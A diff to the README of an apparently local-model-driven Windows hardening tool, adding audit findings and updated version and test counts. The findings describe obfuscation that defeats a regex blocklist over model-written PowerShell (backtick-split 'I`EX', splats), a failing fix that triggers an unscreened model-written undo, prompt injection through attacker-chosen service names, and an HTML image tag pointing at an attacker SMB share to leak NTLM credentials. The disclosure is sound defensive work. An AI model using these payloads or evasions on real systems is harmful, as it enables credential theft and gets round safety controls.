@@ -596,6 +596,10 @@ written as the attack rather than as an assertion about the implementation.
 | **Untrusted search path** | `shutil.which` on Windows searches the *current directory first* — CPython inserts `os.curdir` ahead of PATH. If System32 could not be read, Lares would have run whatever `powershell.exe` sat beside the file someone had just double-clicked, as administrator. The Windows path now only accepts absolute candidates under `%SystemRoot%` and Program Files, and reports a missing binary rather than searching. |
 | **Prompt injection into the code-writing prompt** | The prompt that *assesses* the machine told the model to treat the reading as data. The prompt that *writes PowerShell* did not — exactly backwards, since assessment mislabels and remediation executes. Service display names and installed product names are strings an attacker chooses; malware names itself. The rule is now in both prompts and the reading is fenced. More importantly, the six refusals above were added, because an instruction to a 1.5B model is not a control. |
 | **Terminal output forgery** | A service named `Backup Agent\e[2J\e[H\e[32mEVERYTHING IS FINE` cleared the terminal and printed a reassuring line in green. In a program whose whole output is a security report people act on, letting the subject of the report control the report is the entire problem. All output is stripped of control sequences; a newline in a single-line field is refused too, because that forges a whole line. |
+| **The screen was regex over raw PowerShell** | A later audit went through the rule list and defeated thirteen of them without writing anything clever — a backtick before a newline, a backtick inside an identifier (`` I`EX `` runs), a parenthesis where the rule wanted a space, `net.exe` rather than `net`, colon parameter binding, a splat that moves the parameters somewhere a regex cannot read, and `New-NetFirewallRule`, whose own defaults are Inbound and Allow. Rules are now screened against the text with those undone as well as against the original, so each describes an *operation* rather than a spelling. It is still a blocklist; it now closes the cheap half. |
+| **A model-written undo got the rollback exemption** | That exemption is earned by provenance — a catalogue rollback is the reviewed inverse of a reviewed remediation. A model reply has none, and the model decides when its undo runs, because a fix whose own check reports NOTFIXED sends the executor straight into it. The whole screen, bypassed by writing a fix that fails. |
+| **The journal became elevated PowerShell** | `lares undo` executed a script read back from a file in the user's own profile, which a process running as that user at medium integrity can rewrite — and whoever runs the undo is running as administrator. The rollback is re-rendered from the catalogue and the stored parameters now; the stored text is used only when the control has gone, and then screened in full. |
+| **The desktop application rendered machine text as HTML** | `QLabel` defaults to `AutoText`, which guesses "this is HTML" for anything with a tag in it. A product name written under `HKCU` — no UAC prompt needed — reached a label on the Exposure page: the tags were swallowed, so the operator read a clean name and never saw the payload, and Qt resolved `<img src="\\attacker\share\x.png">`, opening an SMB session from an elevated process and handing over an NTLM authentication of the administrator account. Every label is plain text now. |
 | **Dead write-then-execute primitive** | An unused function wrote a script to a shared temp directory and returned the path. Nothing called it, and its docstring described a design that never shipped. Deleted rather than kept — a privileged process that writes a script and then runs it by path has a window where another user can replace the file, and leaving that lying around is how the bug gets written later. |
 
 What the same pass found already correct, for what it is worth: every
@@ -621,10 +625,10 @@ take it privately.
 
 ## Status, stated plainly
 
-**v0.6.1. The engine is tested. Most of the PowerShell has run once, on one machine.**
+**v0.7.0. The engine is tested. Most of the PowerShell has run once, on one machine.**
 
 The Python — the guard, the executor's state machine, the planner, the catalogue
-loader, the logging, the theme — is covered by **636 tests** that run on Windows
+loader, the logging, the theme — is covered by **702 tests** that run on Windows
 and Linux across Python 3.10 and 3.12 in CI. That part works.
 
 The PowerShell is a different matter, and the honest position has three parts:
@@ -662,7 +666,7 @@ prints one in full.
 | `network` | Firewall profiles and default actions, exposed listeners, SMBv1, LLMNR, Remote Registry |
 | `identity` | UAC, Guest, clear-text autologon passwords, WDigest, LSA protection, anonymous enumeration |
 | `defence` | Defender real-time protection and signatures, tamper protection, ASR rules, SmartScreen, BitLocker, firewall logging |
-| `services` | Unquoted service paths, service binaries in writable directories, Print Spooler, WinRM |
+| `services` | Unquoted service paths, service binaries in writable directories, the Print Spooler, scheduled tasks running as SYSTEM from a writable location |
 | `system` | PowerShell v2, script-block logging, command-line auditing, AutoRun, Windows Update |
 
 The catalogue is the trust boundary, so it is validated hard at load: every
@@ -678,7 +682,7 @@ is a loud failure rather than a silently dropped safety property.
 python -m pytest tests/ -q
 ```
 
-636 tests, none of which need Windows. They cover the guard against injection
+702 tests, none of which need Windows. They cover the guard against injection
 payloads in every parameter slot, the executor's full state machine including
 rollbacks that themselves fail, the planner against the shapes a quantised model
 actually produces, state files that survive being interrupted, the model overlay
